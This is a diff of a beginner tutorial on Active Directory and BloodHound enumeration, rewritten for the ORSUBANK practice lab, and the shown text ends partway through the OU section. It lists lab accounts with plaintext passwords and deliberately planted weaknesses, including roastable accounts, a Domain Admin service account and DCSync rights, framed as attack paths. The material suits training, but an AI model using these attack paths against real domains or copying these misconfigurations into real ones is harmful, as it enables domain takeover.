@@ -1,5 +1,5 @@
 # DOMAIN ENUMERATION WITH BLOODHOUND
-## The Complete Zero-Knowledge Guide
+## The Complete Zero-Knowledge Guide for ORSUBANK Lab
 
 > **"To make an apple pie from scratch, you must first invent the universe."**
 > — Carl Sagan
@@ -17,55 +17,85 @@
 
 ---
 
-# TABLE OF CONTENTS
+# YOUR LAB SETUP
 
-**UNDERSTANDING NETWORKS (From Zero)**
-1. [What is a Network?](#part-1-network)
-2. [Why Do We Need User Accounts?](#part-2-accounts)
-3. [What is a Directory?](#part-3-directory)
-4. [What is Active Directory?](#part-4-active-directory)
-5. [The Domain Controller](#part-5-domain-controller)
+| Computer | IP Address | Role | Primary User |
+|----------|------------|------|--------------|
+| DC01 | 192.168.100.10 | Domain Controller | Administrator |
+| WS01 | 192.168.100.20 | Workstation 1 | vamsi.krishna |
+| WS02 | 192.168.100.30 | Workstation 2 | ravi.teja |
+| Kali | 192.168.100.100 | Attacker Machine | kali |
 
-**UNDERSTANDING AD OBJECTS**
-6. [Users, Groups, and Computers](#part-6-objects)
-7. [Organizational Units (OUs)](#part-7-ous)
-8. [Group Memberships](#part-8-groups)
-9. [Permissions and ACLs](#part-9-permissions)
-
-**HOW AD COMMUNICATES**
-10. [What is LDAP?](#part-10-ldap)
-11. [What is Kerberos?](#part-11-kerberos)
-12. [How Authentication Works](#part-12-authentication)
-
-**THE ATTACKER'S PERSPECTIVE**
-13. [Why Attackers Care About AD](#part-13-attacker-view)
-14. [What is Enumeration?](#part-14-enumeration)
-15. [Attack Paths](#part-15-attack-paths)
-
-**BLOODHOUND**
-16. [What is BloodHound?](#part-16-bloodhound)
-17. [How BloodHound Works](#part-17-how-bloodhound)
-18. [SharpHound - The Data Collector](#part-18-sharphound)
-
-**PRACTICAL EXECUTION**
-19. [Lab Setup](#part-19-lab)
-20. [Running SharpHound](#part-20-running-sharphound)
-21. [Importing Data into BloodHound](#part-21-import)
-22. [Finding Attack Paths](#part-22-finding-paths)
-23. [Advanced Queries](#part-23-queries)
-
-**INTERVIEW & REFERENCE**
-24. [Interview Questions (10+)](#part-24-interview)
-25. [Troubleshooting](#part-25-troubleshoot)
-26. [Next Steps](#part-26-next)
+**Domain:** orsubank.local
 
 ---
 
-# PART 1: What is a Network? {#part-1-network}
+# TABLE OF CONTENTS
+
+## PART 1: UNDERSTANDING NETWORKS (From Zero)
+- [1.1 What is a Network?](#part-11-what-is-a-network)
+- [1.2 Why Do We Need User Accounts?](#part-12-why-do-we-need-user-accounts)
+- [1.3 What is a Directory?](#part-13-what-is-a-directory)
+- [1.4 What is Active Directory?](#part-14-what-is-active-directory)
+- [1.5 The Domain Controller](#part-15-the-domain-controller)
+
+## PART 2: UNDERSTANDING AD OBJECTS
+- [2.1 Users, Groups, and Computers](#part-21-users-groups-and-computers)
+- [2.2 Organizational Units (OUs)](#part-22-organizational-units-ous)
+- [2.3 Group Memberships and Nesting](#part-23-group-memberships-and-nesting)
+- [2.4 Permissions and ACLs](#part-24-permissions-and-acls)
+
+## PART 3: HOW AD COMMUNICATES
+- [3.1 What is LDAP?](#part-31-what-is-ldap)
+- [3.2 What is Kerberos?](#part-32-what-is-kerberos)
+- [3.3 How Authentication Works](#part-33-how-authentication-works)
+
+## PART 4: THE ATTACKER'S PERSPECTIVE
+- [4.1 Why Attackers Care About AD](#part-41-why-attackers-care-about-ad)
+- [4.2 What is Enumeration?](#part-42-what-is-enumeration)
+- [4.3 Attack Paths Explained](#part-43-attack-paths-explained)
+
+## PART 5: BLOODHOUND FUNDAMENTALS
+- [5.1 What is BloodHound?](#part-51-what-is-bloodhound)
+- [5.2 How BloodHound Works](#part-52-how-bloodhound-works)
+- [5.3 SharpHound - The Data Collector](#part-53-sharphound---the-data-collector)
+
+## PART 6: PRACTICAL EXECUTION IN ORSUBANK LAB
+- [6.1 Prerequisites (What You Need)](#part-61-prerequisites-what-you-need)
+- [6.2 Running SharpHound from WS01](#part-62-running-sharphound-from-ws01)
+- [6.3 Exfiltrating Data to Kali](#part-63-exfiltrating-data-to-kali)
+- [6.4 Setting Up BloodHound on Kali](#part-64-setting-up-bloodhound-on-kali)
+- [6.5 Importing Data](#part-65-importing-data)
+
+## PART 7: FINDING ATTACK PATHS IN ORSUBANK
+- [7.1 Finding Domain Admins](#part-71-finding-domain-admins)
+- [7.2 The Nested Group Attack Path](#part-72-the-nested-group-attack-path)
+- [7.3 Kerberoastable Accounts](#part-73-kerberoastable-accounts)
+- [7.4 AS-REP Roastable Accounts](#part-74-as-rep-roastable-accounts)
+- [7.5 Session Hunting](#part-75-session-hunting)
+- [7.6 DCSync Attack Path](#part-76-dcsync-attack-path)
+
+## PART 8: ADVANCED QUERIES
+- [8.1 Custom Cypher Queries](#part-81-custom-cypher-queries)
+- [8.2 Finding Shortest Paths](#part-82-finding-shortest-paths)
+- [8.3 Finding All Paths to DA](#part-83-finding-all-paths-to-da)
+
+## PART 9: INTERVIEW QUESTIONS & REFERENCE
+- [9.1 Interview Questions](#part-91-interview-questions)
+- [9.2 Troubleshooting](#part-92-troubleshooting)
+- [9.3 What's Next](#part-93-whats-next)
+
+---
+
+# PART 1: UNDERSTANDING NETWORKS (From Zero)
+
+---
+
+## Part 1.1: What is a Network?
 
 **Before we talk about AD or BloodHound, we need to understand what a network is.**
 
-## Computers Alone Are Isolated
+### Computers Alone Are Isolated
 
 ```
 IMAGINE A SINGLE COMPUTER:
@@ -87,7 +117,7 @@ Problem: What if you want to share a file with a colleague?
          You'd have to copy it to a USB drive and walk it over!
 ```
 
-## A Network Connects Computers
+### A Network Connects Computers
 
 ```
 A NETWORK IS SIMPLY CONNECTED COMPUTERS:
@@ -95,92 +125,66 @@ A NETWORK IS SIMPLY CONNECTED COMPUTERS:
 
 ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
 │             │    │             │    │             │
-│  COMPUTER 1 │────│  COMPUTER 2 │────│  COMPUTER 3 │
-│  (Vamsi)    │    │  (Lakshmi)  │    │  (Pranavi)  │
+│  WS01       │────│  WS02       │────│  DC01       │
+│ (vamsi)     │    │ (ravi.teja) │    │ (Server)    │
 │             │    │             │    │             │
 └─────────────┘    └─────────────┘    └─────────────┘
        │                  │                  │
        └──────────────────┼──────────────────┘
                           │
-                    NETWORK CABLE
-                    (or WiFi)
+                    192.168.100.0/24
+                   (ORSUBANK NETWORK)
 
 NOW:
-- Vamsi can share files with Lakshmi without USB drives
+- vamsi can share files with ravi.teja without USB drives
 - They can use the same printer
-- They can send messages to each other
-- They can work on the same documents
+- They can access the same file server
+- They can authenticate to the same domain!
 ```
 
-## Real-World Example: Your Home Network
+### ORSUBANK Network
 
 ```
-YOUR HOME NETWORK:
+THE ORSUBANK LAB NETWORK:
 ────────────────────────────────────────────────────────────────
 
-                        INTERNET
-                           │
-                    ┌──────┴──────┐
-                    │             │
-                    │   ROUTER    │ ← This creates your network!
-                    │             │
-                    └──────┬──────┘
-                           │
-         ┌─────────────────┼─────────────────┐
-         │                 │                 │
-    ┌────┴────┐      ┌────┴────┐      ┌────┴────┐
-    │         │      │         │      │         │
-    │ LAPTOP  │      │ PHONE   │      │ SMART   │
-    │         │      │         │      │ TV      │
-    └─────────┘      └─────────┘      └─────────┘
-
-All these devices can "see" each other:
-- Your phone can control your smart TV
-- Your laptop can print to your wireless printer
-- They're all on the SAME NETWORK!
-```
-
-## Business Networks Are Bigger
-
-```
-A COMPANY NETWORK (ORSUBANK):
-────────────────────────────────────────────────────────────────
-
-                         INTERNET
-                            │
-                     ┌──────┴──────┐
-                     │   FIREWALL  │
-                     │  (Security) │
-                     └──────┬──────┘
-                            │
-    ┌───────────────────────┼───────────────────────┐
-    │                       │                       │
-    │               COMPANY NETWORK                 │
-    │                                               │
-    │  ┌─────────┐  ┌─────────┐  ┌─────────┐       │
-    │  │ LAPTOP  │  │ LAPTOP  │  │ DESKTOP │       │
-    │  │ Vamsi   │  │ Lakshmi │  │ Pranavi │       │
-    │  └─────────┘  └─────────┘  └─────────┘       │
-    │                                               │
-    │  ┌─────────┐  ┌─────────┐  ┌─────────┐       │
-    │  │ SERVER  │  │ FILE    │  │ EMAIL   │       │
-    │  │ (Apps)  │  │ SERVER  │  │ SERVER  │       │
-    │  └─────────┘  └─────────┘  └─────────┘       │
-    │                                               │
-    └───────────────────────────────────────────────┘
-
-A company might have:
-- 100 employees with 100 computers
-- 10 servers running applications
-- Printers, phones, cameras...
-- All connected on ONE network
+                          INTERNET
+                             │
+                      ┌──────┴──────┐
+                      │   FIREWALL  │
+                      │  (Security) │
+                      └──────┬──────┘
+                             │
+    ┌────────────────────────┼────────────────────────┐
+    │                        │                        │
+    │        ORSUBANK INTERNAL NETWORK                │
+    │           192.168.100.0/24                      │
+    │                                                 │
+    │  ┌──────────────┐                               │
+    │  │     DC01     │ ← Domain Controller           │
+    │  │  .100.10     │   (The Boss of the network)   │
+    │  └──────────────┘                               │
+    │                                                 │
+    │  ┌──────────────┐  ┌──────────────┐            │
+    │  │     WS01     │  │     WS02     │            │
+    │  │  .100.20     │  │  .100.30     │            │
+    │  │ vamsi.krishna│  │ ravi.teja    │            │
+    │  └──────────────┘  └──────────────┘            │
+    │                                                 │
+    └─────────────────────────────────────────────────┘
+                             │
+                    ┌────────┴────────┐
+                    │      KALI       │
+                    │   .100.100      │ ← YOU (Attacker)
+                    │                 │
+                    └─────────────────┘
 ```
 
 ---
 
-# PART 2: Why Do We Need User Accounts? {#part-2-accounts}
+## Part 1.2: Why Do We Need User Accounts?
 
-## The Problem: Who's Allowed to Do What?
+### The Problem: Who's Allowed to Do What?
 
 ```
 THE PROBLEM WITH JUST CONNECTING COMPUTERS:
@@ -188,102 +192,43 @@ THE PROBLEM WITH JUST CONNECTING COMPUTERS:
 
 If everyone is just connected... who controls what?
 
-BAD SCENARIO:
+BAD SCENARIO AT ORSUBANK:
 - Random person walks in
-- Sits at a computer
+- Sits at WS01
 - Can access EVERYTHING?
-- Financial data? YES
-- Employee records? YES
-- Customer information? YES
+- Customer bank accounts? YES
+- Employee salaries? YES
+- Internal security systems? YES
 
-That's a disaster! We need CONTROL.
+That's a disaster for a bank! We need CONTROL.
 ```
 
-## User Accounts Control Access
+### User Accounts Control Access
 
 ```
 USER ACCOUNTS SOLVE THIS:
 ────────────────────────────────────────────────────────────────
-
-Instead of anyone using any computer...
 
 EACH PERSON gets a USER ACCOUNT:
 - Username: vamsi.krishna
 - Password: (secret)
 
 EACH RESOURCE has PERMISSIONS:
-- Financial Reports folder: Only finance team can access
-- Employee Records: Only HR can access
-- Company Announcements: Everyone can read
+- Customer Data: Only Loan Officers can access
+- Salary Records: Only HR and Finance can access
+- IT Systems: Only IT Department can access
 
 NOW:
 - When you log in, the computer knows WHO you are
 - Based on who you are, it knows WHAT you can access
-- Random person can't just walk in and use everything
-```
-
-## The Problem with Individual Computers
-
-```
-BUT THERE'S STILL A PROBLEM:
-────────────────────────────────────────────────────────────────
-
-SCENARIO: Company has 100 computers
-
-If each computer manages its OWN users:
-
-COMPUTER 1 (Vamsi's):
-- User: vamsi / password123
-
-COMPUTER 2 (Lakshmi's):
-- User: lakshmi / mypassword
-
-COMPUTER 3 (File Server):
-- User: vamsi / password123    ← Had to create again!
-- User: lakshmi / mypassword   ← Had to create again!
-
-PROBLEM 1: Vamsi's account must be created on EVERY computer
-           100 computers = create account 100 times!
-
-PROBLEM 2: If Vamsi changes password, must change on ALL computers!
-
-PROBLEM 3: New employee? Create account on 100 machines!
-
-PROBLEM 4: Employee leaves? Delete account from 100 machines!
-
-THIS DOESN'T SCALE!
+- Random person can't just walk in and access everything
 ```
 
 ---
 
-# PART 3: What is a Directory? {#part-3-directory}
+## Part 1.3: What is a Directory?
 
-## A Directory is a Phone Book for Your Network
-
-```
-THINK OF A PHONE BOOK:
-────────────────────────────────────────────────────────────────
-
-TRADITIONAL PHONE BOOK:
-┌─────────────────────────────────────────────────────────────┐
-│                      PHONE BOOK                              │
-│                                                              │
-│   NAME                    │  PHONE NUMBER                    │
-│   ─────────────────────────────────────────────────────────  │
-│   Krishna, Vamsi          │  555-0101                        │
-│   Devi, Lakshmi           │  555-0102                        │
-│   Orsu, Pranavi           │  555-0103                        │
-│   ...                     │  ...                             │
-│                                                              │
-└─────────────────────────────────────────────────────────────┘
-
-WHAT A PHONE BOOK DOES:
-- Stores information about people (name → phone number)
-- Organized so you can look things up
-- ONE central place for everyone's info
-```
-
-## A Network Directory is the Same Concept
+### A Directory is a Phone Book for Your Network
 
 ```
 A NETWORK DIRECTORY:
@@ -292,1421 +237,1915 @@ A NETWORK DIRECTORY:
 Instead of phone numbers, it stores NETWORK information:
 
 ┌─────────────────────────────────────────────────────────────┐
-│                    NETWORK DIRECTORY                         │
+│                 ORSUBANK NETWORK DIRECTORY                   │
 │                                                              │
 │   USERS:                                                     │
 │   ├── vamsi.krishna                                          │
 │   │   ├── Password: (encrypted)                              │
 │   │   ├── Email: vamsi@orsubank.local                        │
+│   │   ├── Department: Management                             │
+│   │   └── Groups: BankEmployees, Management                  │
+│   │                                                          │
+│   ├── ammulu.orsu                                            │
+│   │   ├── Password: (encrypted)                              │
 │   │   ├── Department: IT                                     │
-│   │   └── Groups: BankEmployees, IT_Team                     │
+│   │   └── Groups: Domain Admins, IT_Team ← POWERFUL!         │
 │   │                                                          │
 │   ├── lakshmi.devi                                           │
-│   │   ├── Password: (encrypted)                              │
-│   │   ├── Email: lakshmi@orsubank.local                      │
-│   │   ├── Department: Finance                                │
-│   │   └── Groups: BankEmployees, Finance_Team                │
+│   │   └── Groups: BankEmployees, IT_Team                     │
 │   │                                                          │
 │   COMPUTERS:                                                 │
 │   ├── WS01                                                   │
 │   │   ├── Operating System: Windows 11                       │
-│   │   └── IP Address: 192.168.100.101                        │
+│   │   └── IP Address: 192.168.100.20                         │
 │   │                                                          │
-│   GROUPS:                                                    │
-│   ├── Domain Admins (can do anything!)                       │
-│   ├── Finance_Team (can access finance files)                │
-│   └── ...                                                    │
-│                                                              │
+│   ├── WS02                                                   │
+│   │   └── IP Address: 192.168.100.30                         │
+│   │                                                          │
+│   SERVICE ACCOUNTS:                                          │
+│   ├── sqlservice                                             │
+│   │   └── SPN: MSSQLSvc/DC01.orsubank.local:1433             │
+│   ├── httpservice                                            │
+│   ├── svc_backup                                             │
+│   │   └── Groups: Domain Admins ← SERVICE ACCOUNT IS DA!     │
+│   │                                                          │
 └─────────────────────────────────────────────────────────────┘
 
 ONE CENTRAL PLACE stores:
-- All user accounts
-- All computer information
-- All groups
-- All permissions
-```
-
-## Why This Solves Our Problem
-
-```
-NOW WITH A CENTRAL DIRECTORY:
-────────────────────────────────────────────────────────────────
-
-BEFORE (No directory):
-- Create vamsi on Computer 1
-- Create vamsi on Computer 2
-- Create vamsi on Computer 3
-- ... 100 more times
-- Vamsi changes password = change 100 times
-
-AFTER (With directory):
-- Create vamsi ONCE in the directory
-- ALL 100 computers ask the directory: "Is this user legit?"
-- Vamsi changes password = change it ONCE
-- All 100 computers automatically use the new password!
-
-
-ANALOGY:
-─────────────────
-Before: Everyone keeps their own contact list
-        (If Vamsi changes phone number, tell 100 people!)
-
-After:  One central phone book that everyone uses
-        (If Vamsi changes phone number, update it once!)
+- All user accounts (10+ employees at ORSUBANK)
+- All computer information (DC01, WS01, WS02)
+- All groups and permissions
+- All service accounts
 ```
 
 ---
 
-# PART 4: What is Active Directory? {#part-4-active-directory}
+## Part 1.4: What is Active Directory?
 
-## Active Directory is Microsoft's Directory Service
+### Active Directory is Microsoft's Directory Service
 
 ```
 ACTIVE DIRECTORY (AD) = MICROSOFT'S NETWORK DIRECTORY
 ────────────────────────────────────────────────────────────────
 
-Microsoft created Active Directory to be THE directory for Windows networks.
+ORSUBANK uses Active Directory to manage everything:
 
-It stores:
-✓ All user accounts
-✓ All computer accounts
-✓ All groups
+✓ All user accounts (vamsi.krishna, ammulu.orsu, lakshmi.devi...)
+✓ All computer accounts (DC01, WS01, WS02)
+✓ All groups (Domain Admins, BankEmployees, IT_Team)
+✓ Service accounts (sqlservice, httpservice, svc_backup)
 ✓ Permissions (who can access what)
 ✓ Policies (password rules, security settings)
-✓ Much more!
 
-Almost EVERY company that uses Windows uses Active Directory!
-- Small company: 50 users
-- Large company: 500,000+ users
-- Government, banks, hospitals, everywhere!
-```
+ORSUBANK AD STRUCTURE:
+──────────────────────
 
-## Active Directory Structure
-
-```
-AD IS ORGANIZED LIKE A TREE:
-────────────────────────────────────────────────────────────────
-
-            ┌───────────────────────────────────────┐
-            │                                       │
-            │   FOREST (orsubank.local)             │
-            │   The whole organization              │
-            │                                       │
-            └───────────────────┬───────────────────┘
-                                │
-            ┌───────────────────┴───────────────────┐
-            │                                       │
-            │   DOMAIN (orsubank.local)             │
-            │   A logical grouping                  │
-            │                                       │
-            └───────────────────┬───────────────────┘
-                                │
-        ┌───────────────────────┼───────────────────────┐
-        │                       │                       │
-┌───────┴───────┐       ┌───────┴───────┐       ┌───────┴───────┐
-│               │       │               │       │               │
-│  OU: Users    │       │ OU: Computers │       │ OU: Groups    │
-│               │       │               │       │               │
-│ - vamsi       │       │ - WS01        │       │ - Domain      │
-│ - lakshmi     │       │ - WS02        │       │   Admins      │
-│ - pranavi     │       │ - DC01        │       │ - IT Team     │
-│               │       │               │       │ - Finance     │
-└───────────────┘       └───────────────┘       └───────────────┘
-
-
-KEY TERMS:
-- FOREST: The whole AD environment (can have multiple domains)
-- DOMAIN: A logical grouping (orsubank.local)
-- OU: Organizational Unit - folders to organize objects
-- OBJECTS: Users, Computers, Groups - the actual things stored
-```
-
-## Why is AD Called "Active" Directory?
-
-```
-"ACTIVE" MEANS IT DOES THINGS:
-────────────────────────────────────────────────────────────────
-
-A regular phone book is PASSIVE:
-- It just sits there
-- You look things up
-- It doesn't do anything on its own
-
-Active Directory is ACTIVE:
-- It authenticates users (checks passwords)
-- It enforces policies (password must be 12 characters!)
-- It replicates changes (updates spread automatically)
-- It responds to queries (programs can ask it questions)
-
-AD is not just storage - it's a living, working system!
+              ┌───────────────────────────────────────┐
+              │                                       │
+              │      DOMAIN: orsubank.local           │
+              │                                       │
+              └───────────────────┬───────────────────┘
+                                  │
+        ┌─────────────────────────┼─────────────────────────┐
+        │                         │                         │
+┌───────┴───────┐         ┌───────┴───────┐         ┌───────┴───────┐
+│               │         │               │         │               │
+│ OU: Bank      │         │ OU: Service   │         │ OU: Groups    │
+│   Employees   │         │   Accounts    │         │               │
+│               │         │               │         │               │
+│ - vamsi       │         │ - sqlservice  │         │ - Domain      │
+│ - ammulu      │         │ - httpservice │         │   Admins      │
+│ - lakshmi     │         │ - iisservice  │         │ - IT_Team     │
+│ - ravi.teja   │         │ - svc_backup  │         │ - HelpDesk    │
+│ - pranavi     │         │               │         │ - Server_     │
+│ - harsha      │         │               │         │   Admins      │
+│ - kiran.kumar │         │               │         │               │
+└───────────────┘         └───────────────┘         └───────────────┘
 ```
 
 ---
 
-# PART 5: The Domain Controller {#part-5-domain-controller}
+## Part 1.5: The Domain Controller
 
-## The Domain Controller (DC) Runs Active Directory
+### The Domain Controller (DC) Runs Active Directory
 
 ```
 DOMAIN CONTROLLER = THE SERVER RUNNING AD
 ────────────────────────────────────────────────────────────────
 
-Active Directory is just SOFTWARE (a database + services).
-It runs on a WINDOWS SERVER called a Domain Controller (DC).
+In ORSUBANK lab, DC01 (192.168.100.10) is the Domain Controller.
 
 ┌─────────────────────────────────────────────────────────────┐
 │                                                              │
-│   DOMAIN CONTROLLER (DC01)                                   │
+│   DC01 - DOMAIN CONTROLLER                                   │
+│   IP: 192.168.100.10                                         │
+│   OS: Windows Server 2025                                    │
 │   ────────────────────────                                   │
 │                                                              │
-│   It's a Windows Server that runs:                           │
+│   It runs:                                                   │
 │   - Active Directory Domain Services (AD DS)                 │
 │   - The AD database (ntds.dit)                               │
-│   - LDAP service (for queries)                               │
-│   - Kerberos service (for authentication)                    │
-│   - DNS service (for name resolution)                        │
+│   - LDAP service (port 389) - for queries                    │
+│   - Kerberos service (port 88) - for authentication          │
+│   - DNS service (port 53) - for name resolution              │
 │                                                              │
 │   ALL USER LOGINS GO THROUGH THIS SERVER!                    │
+│                                                              │
+│   NTDS.DIT contains:                                         │
+│   - Every user's password hash                               │
+│   - Every group membership                                   │
+│   - Every secret in the domain                               │
+│                                                              │
+│   IF YOU COMPROMISE DC01, YOU OWN ORSUBANK!                  │
 │                                                              │
 └─────────────────────────────────────────────────────────────┘
 ```
 
-## How Login Works with a DC
+### How Login Works in ORSUBANK
 
 ```
-WHAT HAPPENS WHEN YOU LOG IN:
+WHAT HAPPENS WHEN VAMSI LOGS INTO WS01:
 ────────────────────────────────────────────────────────────────
 
-1. You sit at WS01 (workstation)
-2. You type: Username: vamsi.krishna
-              Password: MyP@ssw0rd!
+1. vamsi.krishna sits at WS01 (192.168.100.20)
+2. He types: Username: vamsi.krishna
+              Password: B@nkM@nager2024!
 
 3. WS01 doesn't know if this is correct!
-   WS01 asks DC01: "Hey, is vamsi.krishna / MyP@ssw0rd! valid?"
+   WS01 asks DC01: "Hey, is vamsi.krishna / B@nkM@nager2024! valid?"
 
-4. DC01 checks its database:
+4. DC01 checks its database (ntds.dit):
    - Does vamsi.krishna exist? YES
    - Is the password correct? YES
    - Is the account enabled? YES
    - DC01 → WS01: "Yes, this user is legit!"
 
-5. WS01 lets you log in.
-
-6. Now WS01 knows you are vamsi.krishna
-   and can check what you're allowed to access.
+5. WS01 lets vamsi log in.
 
 
 VISUALIZATION:
 ─────────────────
 
-[YOU] ──login──► [WS01] ──"is this valid?"──► [DC01]
-                    │                             │
-                    │                             │
-                    │ ◄──"yes, valid!"────────────┘
-                    │
-                    └──► Welcome, vamsi.krishna!
-```
-
-## The DC is the Kingdom's Castle
-
-```
-ANALOGY: THE KINGDOM
-────────────────────────────────────────────────────────────────
-
-DOMAIN = THE KINGDOM (orsubank.local)
-- All the land, people, and resources
-
-DOMAIN CONTROLLER = THE CASTLE
-- Where the king lives
-- Where all records are kept
-- Where decisions are made
-
-USERS = THE CITIZENS
-- They live in the kingdom
-- They need permission to access things
-
-DOMAIN ADMIN = THE KING
-- Can do ANYTHING in the kingdom
-- Has absolute power
-
-
-AS AN ATTACKER:
-─────────────────
-If you capture the CASTLE (Domain Controller)...
-You own the ENTIRE KINGDOM (whole network)!
-
-This is why AD attacks aim for Domain Admin!
-Control DC = Control Everything!
+[VAMSI] ──login──► [WS01] ──"is this valid?"──► [DC01]
+                       │       192.168.100.20→10    │
+                       │                             │
+                       │ ◄──"yes, valid!"────────────┘
+                       │
+                       └──► Welcome, vamsi.krishna!
 ```
 
 ---
 
-# PART 6: Users, Groups, and Computers {#part-6-objects}
+# PART 2: UNDERSTANDING AD OBJECTS
 
-## AD Objects - The Things Stored in AD
+---
+
+## Part 2.1: Users, Groups, and Computers
+
+### ORSUBANK User Objects
 
 ```
-EVERYTHING IN AD IS AN "OBJECT":
+ORSUBANK HAS THESE USER ACCOUNTS:
 ────────────────────────────────────────────────────────────────
 
-OBJECT TYPE         │  WHAT IT REPRESENTS
+MANAGEMENT:
+├── vamsi.krishna       │ Bank Manager
+│   └── Groups: BankEmployees, Management
+│
+├── ammulu.orsu         │ IT Manager
+│   └── Groups: Domain Admins, IT_Team  ← DOMAIN ADMIN!
+│
+IT DEPARTMENT:
+├── lakshmi.devi        │ System Administrator  
+│   └── Groups: IT_Team, BankEmployees
+│
+├── ravi.teja           │ Network Administrator
+│   └── Groups: IT_Team, BankEmployees
+│
+BRANCH STAFF:
+├── pranavi             │ Branch Manager
+│   └── DoesNotRequirePreAuth: TRUE  ← AS-REP ROASTABLE!
+│   └── Password: Branch123!
+│
+├── harsha.vardhan      │ Customer Service Manager
+│   └── DoesNotRequirePreAuth: TRUE  ← AS-REP ROASTABLE!
+│   └── Password: Customer2024!
+│   └── Groups: HelpDesk_Team → IT_Support → Server_Admins → DA!
+│
+├── kiran.kumar         │ Financial Analyst
+│   └── DoesNotRequirePreAuth: TRUE  ← AS-REP ROASTABLE!
+│   └── Password: Finance1!
+│
+SERVICE ACCOUNTS:
+├── sqlservice          │ SPN: MSSQLSvc/DC01:1433
+│   └── Password: MYpassword123#  ← KERBEROASTABLE!
+│
+├── httpservice         │ SPN: HTTP/web.orsubank.local
+│   └── Password: Summer2024!  ← KERBEROASTABLE!
+│
+├── iisservice          │ SPN: HTTP/app.orsubank.local
+│   └── Password: P@ssw0rd  ← KERBEROASTABLE!
+│
+├── backupservice       │ SPN: MSSQLSvc/DC01:1434
+│   └── Password: SQLAgent123!  ← KERBEROASTABLE!
+│
+└── svc_backup          │ SPN: backup/dc01.orsubank.local
+    └── Password: Backup@2024!
+    └── Groups: Domain Admins  ← SERVICE ACCOUNT IS DA!
+```
+
+### Computer Objects
+
+```
+ORSUBANK COMPUTER ACCOUNTS:
 ────────────────────────────────────────────────────────────────
-User                │  A person who logs in (vamsi.krishna)
-Computer            │  A machine joined to the domain (WS01)
-Group               │  A collection of users/computers
-Organizational Unit │  A folder to organize objects
-Group Policy        │  Settings that apply to users/computers
-```
 
-## User Objects
+DC01$                           ← Domain Controller
+├── dNSHostName: DC01.orsubank.local
+├── operatingSystem: Windows Server 2025
+├── IP: 192.168.100.10
+└── Role: Holds all AD data, authentication hub
 
-```
-A USER OBJECT STORES EVERYTHING ABOUT A PERSON:
-────────────────────────────────────────────────────────────────
-
-USER: vamsi.krishna
-├── sAMAccountName: vamsi.krishna     ← Login name
-├── userPrincipalName: vamsi.krishna@orsubank.local
-├── displayName: Vamsi Krishna Orsu
-├── mail: vamsi@orsubank.local
-├── department: Information Technology
-├── title: Security Engineer
-├── manager: CN=lakshmi.devi,OU=Users,DC=orsubank,DC=local
-├── memberOf:                          ← Groups this user is in
-│   ├── CN=Domain Users,CN=Users,DC=orsubank,DC=local
-│   ├── CN=IT_Team,OU=Groups,DC=orsubank,DC=local
-│   └── CN=BankEmployees,OU=Groups,DC=orsubank,DC=local
-├── lastLogon: 2024-12-27 10:30:00
-├── pwdLastSet: 2024-12-01 09:00:00
-├── userAccountControl: 512            ← Account flags (enabled, etc.)
-└── ... many more attributes!
-```
-
-## Computer Objects
-
-```
-A COMPUTER OBJECT REPRESENTS A MACHINE:
-────────────────────────────────────────────────────────────────
-
-COMPUTER: WS01$                        ← Note the $ at the end!
+WS01$                           ← Workstation 1
 ├── dNSHostName: WS01.orsubank.local
 ├── operatingSystem: Windows 11 Pro
-├── operatingSystemVersion: 10.0 (22631)
-├── lastLogonTimestamp: 2024-12-27 08:00:00
-├── servicePrincipalName:              ← What services it offers
-│   ├── HOST/WS01.orsubank.local
-│   ├── HOST/WS01
-│   └── RestrictedKrbHost/WS01.orsubank.local
-└── ... more attributes
+├── IP: 192.168.100.20
+├── Primary User: vamsi.krishna
+└── SPECIAL: Has DCSync rights! ← VULNERABILITY!
 
-
-WHY COMPUTERS HAVE ACCOUNTS:
-────────────────────────────
-Just like users, computers need to prove who they are!
-When WS01 talks to DC01, it authenticates using its computer account.
-This prevents random computers from joining the network.
-```
-
-## Group Objects
-
-```
-A GROUP IS A COLLECTION:
-────────────────────────────────────────────────────────────────
-
-Instead of giving permissions to individual users...
-Give permissions to a GROUP, then add users to the group!
-
-
-GROUP: Finance_Team
-├── member:
-│   ├── CN=lakshmi.devi,OU=Users,DC=orsubank,DC=local
-│   ├── CN=pranavi,OU=Users,DC=orsubank,DC=local
-│   └── CN=harsha.vardhan,OU=Users,DC=orsubank,DC=local
-└── description: Members of the Finance department
-
-
-WHY GROUPS MATTER:
-──────────────────
-SCENARIO: Finance folder should only be accessed by finance team
-
-WITHOUT GROUPS:
-- Give permission to lakshmi.devi
-- Give permission to pranavi
-- Give permission to harsha.vardhan
-- New person joins? Give them permission too!
-- Someone leaves? Remove their permission!
-
-WITH GROUPS:
-- Give permission to Finance_Team group (ONCE)
-- Add/remove people from the group as needed
-- Permissions automatically apply!
+WS02$                           ← Workstation 2
+├── dNSHostName: WS02.orsubank.local
+├── operatingSystem: Windows 11 Pro
+├── IP: 192.168.100.30
+└── Primary User: ravi.teja
 ```
 
 ---
 
-# PART 7: Organizational Units (OUs) {#part-7-ous}
-
-## OUs Are Folders for Organization
+## Part 2.2: Organizational Units (OUs)
 
 ```
-ORGANIZATIONAL UNITS = FOLDERS IN AD
+ORSUBANK OU STRUCTURE:
 ────────────────────────────────────────────────────────────────
-
-Just like folders on your computer organize files...
-OUs organize AD objects!
 
 DOMAIN: orsubank.local
 │
-├── OU=BankEmployees
+├── OU=BankEmployees              ← All regular employees
 │   ├── CN=vamsi.krishna
+│   ├── CN=ammulu.orsu
 │   ├── CN=lakshmi.devi
-│   └── CN=pranavi
+│   ├── CN=ravi.teja
+│   ├── CN=pranavi
+│   ├── CN=harsha.vardhan
+│   ├── CN=kiran.kumar
+│   ├── CN=divya
+│   └── CN=madhavi
 │
-├── OU=IT_Department
-│   ├── CN=ammulu.orsu        ← IT Manager
-│   └── CN=kiran.kumar        ← IT Admin
+├── OU=ServiceAccounts            ← Service accounts
+│   ├── CN=sqlservice
+│   ├── CN=httpservice
+│   ├── CN=iisservice
+│   └── CN=backupservice
 │
-├── OU=Workstations
-│   ├── CN=WS01$
-│   └── CN=WS02$
+├── CN=Users                      ← Default container
+│   └── CN=svc_backup            ← The DA service account!
 │
-├── OU=Servers
-│   └── CN=FileServer01$
-│
-└── OU=Service Accounts
-    ├── CN=svc_backup
-    └── CN=svc_sql
-```
-
-## OUs Also Apply Policies
-
-```
-OUs LET YOU APPLY SETTINGS TO GROUPS OF OBJECTS:
-────────────────────────────────────────────────────────────────
-
-EXAMPLE: Different password policies for different groups
-
-OU=BankEmployees
-└── Policy: Password must be 12 characters
-
-OU=Service Accounts  
-└── Policy: Password must be 25 characters
-
-OU=Executives
